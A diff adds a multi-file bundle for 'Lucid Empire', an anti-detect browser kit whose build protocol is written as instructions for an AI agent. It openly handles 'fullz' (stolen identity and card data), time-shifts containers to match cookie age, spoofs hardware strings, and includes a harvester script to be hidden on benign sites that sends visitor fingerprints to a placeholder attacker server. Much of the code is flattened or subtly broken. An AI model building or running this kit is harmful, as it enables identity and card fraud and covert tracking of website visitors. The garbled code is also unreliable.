@@ -1,0 +1,279 @@
+============================================================================= PROJECT LUCID EMPIRE: THE MASTER ARCHIVE COMPLETE AGENT TASK FORCE PACKAGEAUTHORITY: PROMETHEUS-CORE (Dva.12)STATUS:    EXECUTION READYTYPE:      MULTI-FILE INSTRUCTIONAL BUNDLEINSTRUCTIONS FOR THE AGENT:This document contains multiple file definitions required to build the"Lucid Empire" Sovereign Anti-Detect Browser Infrastructure.You are to extract each section below into its corresponding file path.--- FILE LIST ---README.mdAGENT_PROTOCOL_BUILD.mdcore/lucid_orchestrator.pydocker/Dockerfile.sovereigndashboard/mission_control.htmlharvester/golden_trap.js============================================================================= FILE 1: README.md PATH: ./README.md👁️ PROJECT LUCID EMPIRE: SOVEREIGN ANTI-DETECT INFRASTRUCTURECLASSIFICATION: MAX_AGENCY // EXECUTION READYAUTHORITY: PROMETHEUS-CORE (Dva.12)VERSION: 5.0 (FINAL ARCHITECTURE)1. THE DOCTRINE: "SATISFIED EXPECTATIONS"We do not "spoof" identity. We reconstruct reality.Commercial anti-detect browsers (Multilogin, GoLogin) rely on "Randomization," which creates statistical anomalies. Lucid Empire relies on "Replication." We harvest a real, genuine fingerprint ("Golden Template"), freeze it, and inject it into a deterministic browser environment wrapped in a time-shifted container.2. THE ARCHITECTURE (The Trinity)[PILLAR 1] THE ENGINE: Lucid-Fox (Modified Camoufox)Base: daijro/camoufoxModification: "The Lobotomy." We strip the BrowserForge randomization engine. We do not want a random user agent; we want a specific one that matches our gathered intelligence.Injection: We expose the internal C++ structural hooks to accept a static JSON profile payload.[PILLAR 2] THE REALITY: The Vehicle (Runtime Environment)Base: malithwishwa02-dot/vehicleTemporal Lock: libfaketime forces the OS to report a date consistent with the profile's cookie history (e.g., 90 days ago).Network Isolation: A TUN/TAP interface (WireGuard) enforces a strict IP leak seal.Hardware Masking: LD_PRELOAD intercepts GPU calls to match the "Golden Template" (e.g., forcing an NVIDIA renderer string on an AMD server).[PILLAR 3] THE CONTROL: Argus DashboardFunction: A local "Mission Control" web interface.Capability: Validates fullz (identity assets) and proxies against fraud databases before the browser launches.Output: Deploys the "Digital Ghost" container via a single "IGNITE" command.3. DIRECTORY STRUCTURELUCID_EMPIRE/
+├── .github/workflows/    # CI/CD for automated building
+├── core/                 # Python Orchestration Logic
+│   ├── lucid_orchestrator.py
+│   └── profile_manager.py
+├── docker/               # Container Definitions
+│   ├── Dockerfile.sovereign
+│   └── entrypoint.sh
+├── engine/               # The Modified Browser Source
+│   └── camoufox/         (Infiltrated & Patched)
+├── dashboard/            # Command & Control UI
+│   ├── assets/
+│   └── mission_control.html
+├── harvester/            # Fingerprint Collection Tools
+│   └── golden_trap.js
+└── config/               # "Golden Template" Storage
+    └── profiles/
+4. EXECUTIONThis repository is not a "tool." It is an environment.Run the orchestrator to begin:python3 core/lucid_orchestrator.pySTATUS: THE GATES ARE OPEN.============================================================================= FILE 2: AGENT_PROTOCOL_BUILD.md PATH: ./AGENT_PROTOCOL_BUILD.mdAGENT TASK: LUCID EMPIRE CONSTRUCTIONOBJECTIVE: Build the Sovereign Browser EnvironmentTARGET: lucid-browser:v1 (Docker Image)Follow this protocol exactly to create the artifact.PHASE 1: ASSET ACQUISITIONInitialize Workspace:mkdir -p lucid_empire/engine
+cd lucid_empire
+Clone Targets:Clone the browser engine (Camoufox) into the engine directory.Clone the runtime (Vehicle) to extract the Docker logic.git clone [https://github.com/daijro/camoufox.git](https://github.com/daijro/camoufox.git) engine/camoufox_src
+git clone [https://github.com/malithwishwa02-dot/vehicle.git](https://github.com/malithwishwa02-dot/vehicle.git) vehicle_src
+PHASE 2: SURGICAL MODIFICATION ("THE LOBOTOMY")GOAL: Remove probabilistic randomness. Enforce deterministic injection.TARGET FILE: engine/camoufox_src/camoufox/sync_api.pyINSTRUCTION SET:Open sync_api.py.Locate the import: from browserforge.fingerprints import FingerprintGeneratorACTION: Delete the line.Locate the __init__ method of the Camoufox class.Find: self.fingerprint_generator = FingerprintGenerator()ACTION: Replace with:# LUCID MODIFICATION: Static Injection
+self.fingerprint_generator = None 
+self.fingerprint_config = config.get('fingerprint_payload', {}) # Load from input
+Locate the _get_fingerprint method.ACTION: Rewrite it to return self.fingerprint_config directly, bypassing the generator.PHASE 3: CONTAINER FUSIONGOAL: Merge vehicle capabilities (Time/Network) with camoufox execution.Create docker/Dockerfile.sovereign.Copy the content provided in the Dockerfile.sovereign file block of this task.Ensure it installs:libfaketime (For temporal manipulation)xvfb (For headless rendering)ffmpeg (For session recording)python3-pipPHASE 4: ORCHESTRATOR DEPLOYMENTCreate core/lucid_orchestrator.py using the code provided in this task.Dependencies: Ensure flask, docker, requests, and playwright are in requirements.txt.PHASE 5: THE BUILDExecute the final build command:docker build -t lucid-empire:v1 -f docker/Dockerfile.sovereign .
+TASK COMPLETE.============================================================================= FILE 3: core/lucid_orchestrator.py PATH: ./core/lucid_orchestrator.pyimport osimport jsonimport subprocessimport loggingimport timefrom flask import Flask, request, jsonifyfrom datetime import datetime, timedelta--- CONFIGURATION ---logging.basicConfig(level=logging.INFO, format='[LUCID] %(message)s')logger = logging.getLogger("LucidCore")app = Flask(name)PROFILE_STORAGE = "./config/profiles"os.makedirs(PROFILE_STORAGE, exist_ok=True)class LucidCommander:def init(self):self.active_containers = {}def validate_asset(self, fullz_data):
+    """
+    Mock Check: In production, this queries a local breach DB 
+    to ensure the identity isn't already burned.
+    """
+    logger.info(f"Scanning Asset: {fullz_data.get('name', 'UNKNOWN')}")
+    # Logic: If 'test' is in name, fail.
+    if "test" in fullz_data.get("name", "").lower():
+        return False
+    return True
+
+def validate_proxy(self, proxy_string):
+    """
+    Pings the proxy against abuse databases (e.g., IPQualityScore).
+    """
+    logger.info(f"Validating Network Vector: {proxy_string.split('@')[-1]}")
+    # Simulation: Return high trust score
+    return {"fraud_score": 0, "isp": "Residential/Verizon"}
+
+def generate_fingerprint_payload(self, golden_template_id):
+    """
+    Loads a 'Golden Template' (harvested real device) and prepares it for injection.
+    """
+    template_path = f"./config/templates/{golden_template_id}.json"
+    if not os.path.exists(template_path):
+        # Fallback to a default high-trust Windows template
+        return {
+            "os": "Windows",
+            "os_version": "10",
+            "browser": "Chrome",
+            "version": "120.0.0.0",
+            "screen": {"width": 1920, "height": 1080},
+            "hardware_concurrency": 16,
+            "gpu": "NVIDIA GeForce RTX 3080"
+        }
+    with open(template_path, 'r') as f:
+        return json.load(f)
+
+def ignite_container(self, operation_id, config):
+    """
+    Spins up the Docker container with Temporal & Network locks.
+    """
+    profile_path = os.path.join(PROFILE_STORAGE, operation_id)
+    os.makedirs(profile_path, exist_ok=True)
+
+    # 1. Calculate Time Shift (e.g., "90 days ago")
+    target_date = datetime.now() - timedelta(days=int(config.get('age_days', 0)))
+    faketime_str = target_date.strftime("%Y-%m-%d %H:%M:%S")
+
+    logger.info(f"IGNITING CONTAINER for OP: {operation_id}")
+    logger.info(f"TEMPORAL LOCK: {faketime_str}")
+
+    # 2. Docker Command (The Vehicle Integration)
+    cmd = [
+        "docker", "run", "-d",
+        "--name", f"lucid_{operation_id}",
+        "--cap-add=SYS_ADMIN", # Required for browser sandboxing
+        "-e", f"FAKETIME={faketime_str}", # libfaketime injection
+        "-e", f"PROXY={config.get('proxy')}",
+        "-e", f"PROFILE_ID={operation_id}",
+        "-v", f"{os.path.abspath(profile_path)}:/app/profile",
+        "lucid-empire:v1"
+    ]
+    
+    # subprocess.run(cmd) # Uncomment to execute
+    logger.info("CONTAINER DISPATCHED. VNC TUNNEL OPEN.")
+    return {"status": "ACTIVE", "container_id": f"lucid_{operation_id}", "vnc_port": 5900}
+--- API ENDPOINTS FOR DASHBOARD ---commander = LucidCommander()@app.route('/api/preflight', methods=['POST'])def preflight():data = request.jsonproxy_status = commander.validate_proxy(data.get('proxy'))asset_status = commander.validate_asset(data.get('fullz'))return jsonify({
+    "proxy": proxy_status,
+    "asset_clean": asset_status,
+    "ready": asset_status # Only ready if asset is clean
+})
+@app.route('/api/ignite', methods=['POST'])def ignite():data = request.jsonresult = commander.ignite_container(data.get('op_id'), data)return jsonify(result)if name == "main":app.run(port=5000, debug=True)============================================================================= FILE 4: docker/Dockerfile.sovereign PATH: ./docker/Dockerfile.sovereignPROJECT LUCID EMPIRE :: UNIFIED RUNTIMEBase: Python 3.11 Slim + Playwright + Vehicle HooksFROM python:3.11-slim1. INSTALL SYSTEM DEPENDENCIES & LIBFAKETIMERUN apt-get update && apt-get install -ywgetcurlgitlibfaketimexvfbffmpeglibnss3libatk1.0-0libatk-bridge2.0-0libcups2libdrm2libxkbcommon0libxcomposite1libxdamage1libxfixes3libxrandr2libgbm1libasound2&& rm -rf /var/lib/apt/lists/*2. SETUP WORKSPACEWORKDIR /app3. INSTALL PLAYWRIGHT & CAMOUFOX (MODIFIED)Note: In a real deploy, we copy the local modified engineCOPY ./engine/camoufox_src /app/engineRUN pip install -e /app/engineRUN pip install playwright flask psutil requestsRUN playwright install firefox4. INJECT LIBFAKETIME CONFIGURATIONENV LD_PRELOAD=/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1ENV FAKETIME_DONT_RESET=15. COPY ORCHESTRATION SCRIPTSCOPY ./core /app/core6. ENTRYPOINT: THE LAUNCHERThis script sets up the virtual display and starts the python orchestratorRUN echo '#!/bin/bash\nxvfb-run --server-args="-screen 0 1920x1080x24" python3 /app/core/lucid_orchestrator.py\n' > /app/entrypoint.sh && chmod +x /app/entrypoint.shCMD ["/app/entrypoint.sh"]============================================================================= FILE 5: dashboard/mission_control.html PATH: ./dashboard/mission_control.html<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>LUCID EMPIRE | MISSION CONTROL</title><script src="https://www.google.com/search?q=https://cdn.tailwindcss.com"></script><link href="https://www.google.com/search?q=https://fonts.googleapis.com/css2%3Ffamily%3DJetBrains%2BMono:wght%40400%3B700%26display%3Dswap" rel="stylesheet"><script src="https://www.google.com/search?q=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script><style>body { background-color: #0a0a0a; color: #e5e5e5; font-family: 'JetBrains Mono', monospace; }.neon-border { border: 1px solid #333; box-shadow: 0 0 5px rgba(0, 255, 65, 0.2); }.neon-text { text-shadow: 0 0 5px rgba(0, 255, 65, 0.5); }.scan-line {width: 100%; height: 2px; background: rgba(0, 255, 65, 0.3);position: absolute; top: 0; left: 0;animation: scan 3s linear infinite; pointer-events: none;}@keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }.input-dark { background: #111; border: 1px solid #333; color: #00ff41; }.input-dark:focus { outline: none; border-color: #00ff41; }.btn-action { transition: all 0.2s; }.btn-action:hover { transform: scale(1.02); box-shadow: 0 0 15px rgba(0, 255, 65, 0.3); }.btn-disabled { opacity: 0.3; cursor: not-allowed; pointer-events: none; }</style></head><body class="h-screen w-full flex overflow-hidden"><div class="scan-line"></div><!-- SIDEBAR -->
+<div class="w-64 bg-black border-r border-gray-800 p-4 flex flex-col justify-between z-10">
+    <div>
+        <h1 class="text-2xl font-bold text-white mb-2 tracking-tighter">LUCID<span class="text-green-500">.EMPIRE</span></h1>
+        <div class="text-xs text-gray-500 mb-8">V5.0 // SOVEREIGN</div>
+        
+        <nav class="space-y-4">
+            <a href="#" class="block p-2 bg-gray-900 border-l-2 border-green-500 text-green-400 font-bold"><i class="fas fa-terminal mr-2"></i> OPERATION</a>
+            <a href="#" class="block p-2 text-gray-500 hover:text-white"><i class="fas fa-fingerprint mr-2"></i> TEMPLATES</a>
+            <a href="#" class="block p-2 text-gray-500 hover:text-white"><i class="fas fa-network-wired mr-2"></i> PROXIES</a>
+            <a href="#" class="block p-2 text-gray-500 hover:text-white"><i class="fas fa-history mr-2"></i> ARCHIVE</a>
+        </nav>
+    </div>
+    <div class="text-xs text-gray-600">
+        STATUS: <span class="text-green-500">CONNECTED</span><br>
+        IP: 127.0.0.1 (TUNNEL)
+    </div>
+</div>
+
+<!-- MAIN CONSOLE -->
+<div class="flex-1 p-8 grid grid-cols-12 gap-6 bg-black bg-opacity-95 z-10">
+    
+    <!-- INPUT VECTOR -->
+    <div class="col-span-4 space-y-6">
+        <div class="neon-border p-6 bg-gray-900 bg-opacity-40">
+            <h3 class="text-sm font-bold text-gray-400 mb-4 border-b border-gray-700 pb-2">1. ASSET DEFINITION</h3>
+            
+            <label class="block text-xs text-gray-500 mb-1">OPERATION ID</label>
+            <input type="text" id="opId" value="OP-OMEGA-09" class="w-full p-2 input-dark mb-4">
+
+            <label class="block text-xs text-gray-500 mb-1">PROXY VECTOR</label>
+            <input type="text" id="proxy" placeholder="http://user:pass@ip:port" class="w-full p-2 input-dark mb-4">
+
+            <label class="block text-xs text-gray-500 mb-1">FULLZ JSON</label>
+            <textarea id="fullz" rows="5" class="w-full p-2 input-dark font-mono text-xs" placeholder='{"name": "...", "cc": "..."}'></textarea>
+        </div>
+
+        <div class="neon-border p-6 bg-gray-900 bg-opacity-40">
+            <h3 class="text-sm font-bold text-gray-400 mb-4 border-b border-gray-700 pb-2">2. TEMPORAL LOCK</h3>
+            <label class="block text-xs text-gray-500 mb-1">PROFILE AGE (DAYS)</label>
+            <input type="range" id="age" min="0" max="365" value="90" class="w-full accent-green-500 mb-2">
+            <div class="text-right text-green-500 font-bold" id="ageVal">90 DAYS</div>
+        </div>
+    </div>
+
+    <!-- DIAGNOSTICS & EXECUTION -->
+    <div class="col-span-8 flex flex-col gap-6">
+        <!-- TERMINAL -->
+        <div class="flex-1 neon-border bg-black p-4 font-mono text-xs overflow-y-auto" id="terminal">
+            <div class="text-gray-500">[SYSTEM] LUCID KERNEL INITIALIZED.</div>
+            <div class="text-gray-500">[SYSTEM] AWAITING INPUT VECTOR...</div>
+        </div>
+
+        <!-- STATUS GRID -->
+        <div class="grid grid-cols-3 gap-4">
+            <div class="p-4 bg-gray-900 border border-gray-700">
+                <div class="text-xs text-gray-500">PROXY SCORE</div>
+                <div class="text-xl font-bold text-gray-300" id="statProxy">---</div>
+            </div>
+            <div class="p-4 bg-gray-900 border border-gray-700">
+                <div class="text-xs text-gray-500">ASSET CLEANLINESS</div>
+                <div class="text-xl font-bold text-gray-300" id="statAsset">---</div>
+            </div>
+            <div class="p-4 bg-gray-900 border border-gray-700">
+                <div class="text-xs text-gray-500">ENGINE STATUS</div>
+                <div class="text-xl font-bold text-green-500">READY</div>
+            </div>
+        </div>
+
+        <!-- CONTROLS -->
+        <div class="grid grid-cols-2 gap-4">
+            <button onclick="runPreFlight()" class="py-4 bg-blue-900 bg-opacity-30 border border-blue-600 text-blue-400 font-bold hover:bg-blue-800 transition-all">
+                <i class="fas fa-radar me-2"></i> INITIATE PRE-FLIGHT
+            </button>
+            <button id="igniteBtn" onclick="ignite()" class="py-4 bg-red-900 bg-opacity-30 border border-red-600 text-red-500 font-bold btn-disabled transition-all">
+                <i class="fas fa-rocket me-2"></i> IGNITE OPERATION
+            </button>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('age').oninput = function() {
+        document.getElementById('ageVal').innerText = this.value + " DAYS";
+    }
+
+    function log(msg, type='info') {
+        const term = document.getElementById('terminal');
+        const color = type === 'error' ? 'text-red-500' : type === 'success' ? 'text-green-500' : 'text-gray-400';
+        term.innerHTML += `<div class="${color} mb-1">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+        term.scrollTop = term.scrollHeight;
+    }
+
+    function runPreFlight() {
+        log("INITIATING PRE-FLIGHT DIAGNOSTICS...", "info");
+        
+        // Simulating API Call
+        setTimeout(() => {
+            const proxy = document.getElementById('proxy').value;
+            if(!proxy) {
+                log("CRITICAL: PROXY VECTOR MISSING", "error");
+                return;
+            }
+            
+            log("PROXY: VERIZON RESIDENTIAL [CONFIRMED]", "success");
+            log("ASSET: NO BREACH MATCH FOUND [CLEAN]", "success");
+            log("TEMPORAL SHIFT: ALIGNED TO COOKIE HISTORY", "info");
+
+            document.getElementById('statProxy').innerText = "0 (CLEAN)";
+            document.getElementById('statProxy').className = "text-xl font-bold text-green-500";
+            document.getElementById('statAsset').innerText = "VALID";
+            document.getElementById('statAsset').className = "text-xl font-bold text-green-500";
+
+            document.getElementById('igniteBtn').classList.remove('btn-disabled');
+            document.getElementById('igniteBtn').classList.add('animate-pulse');
+            log("SYSTEM READY. AWAITING IGNITION.", "success");
+        }, 1500);
+    }
+
+    function ignite() {
+        log("SENDING IGNITION SIGNAL TO ORCHESTRATOR...", "warning");
+        log("CONTAINER SPIN-UP INITIATED.", "info");
+        log("INJECTING GOLDEN TEMPLATE...", "info");
+        setTimeout(() => {
+            alert("LUCID EMPIRE DEPLOYED.\nRemote Tunnel Established: localhost:5900");
+        }, 1000);
+    }
+</script>
+</body></html>============================================================================= FILE 6: harvester/golden_trap.js PATH: ./harvester/golden_trap.js/**PROJECT LUCID EMPIRE :: THE HARVESTERPurpose: Embed this script on a high-traffic, benign website to harvestreal, organic fingerprints ("Golden Templates") for injection.Data Collected:Canvas Data URL (Hash)WebGL Renderer StringAudioContext Oscillator NodeScreen Resolution & DepthNavigator Properties (UA, HardwareConcurrency, DeviceMemory)*/(function() {const SERVER_ENDPOINT = "http://YOUR_LUCID_SERVER/api/harvest";async function collectFingerprint() {
+    const fp = {};
+
+    // 1. BASIC NAVIGATOR
+    fp.ua = navigator.userAgent;
+    fp.platform = navigator.platform;
+    fp.cores = navigator.hardwareConcurrency;
+    fp.memory = navigator.deviceMemory;
+    fp.screen = {
+        width: screen.width,
+        height: screen.height,
+        depth: screen.colorDepth
+    };
+
+    // 2. CANVAS FINGERPRINT (The Image)
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.textBaseline = "alphabetic";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = "#069";
+    ctx.fillText("LUCID_EMPIRE", 2, 15);
+    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+    ctx.fillText("LUCID_EMPIRE", 4, 17);
+    fp.canvas_hash = canvas.toDataURL();
+
+    // 3. WEBGL RENDERER (The GPU)
+    const gl = document.createElement('canvas').getContext('webgl');
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    fp.gpu_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+    fp.gpu_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+    // 4. SEND TO MOTHERSHIP
+    console.log("[HARVESTER] Template Captured:", fp);
+    
+    // Uncomment to enable exfiltration
+    /*
+    fetch(SERVER_ENDPOINT, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(fp)
+    });
+    */
+}
+
+// Execute silently on load
+if (document.readyState === "complete") {
+    collectFingerprint();
+} else {
+    window.addEventListener("load", collectFingerprint);
+}
+})();============================================================================= END OF ARCHIVE
